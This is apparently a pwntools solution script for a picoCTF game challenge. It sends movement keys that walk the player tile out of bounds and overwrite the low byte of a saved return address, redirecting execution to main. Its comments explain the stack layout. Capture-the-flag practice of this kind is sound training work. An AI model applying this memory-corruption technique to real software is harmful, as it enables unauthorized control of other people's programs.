from pwn import *
elf = ELF('/home/kali/Downloads/game')
#p = elf.process()
p=remote('saturn.picoctf.net', 49978)

#32-bit

#0x08049709
#change the player_tile to x5D

#first go to position 0, then up two more, to not modify the values on the stack that we don't want to mess with.

#then go to map-39, and back down two, to overwrite the ret LSB to reach main.

p.sendline(b'l'+b'\x60')
sleep(1)
p.sendline(b'w'*4 + b'a'*4 + b'w'*1 +b'a'*39+b's'*1)
#gdb.attach(p, gdbscript='b* 0x8049542')


p.interactive()
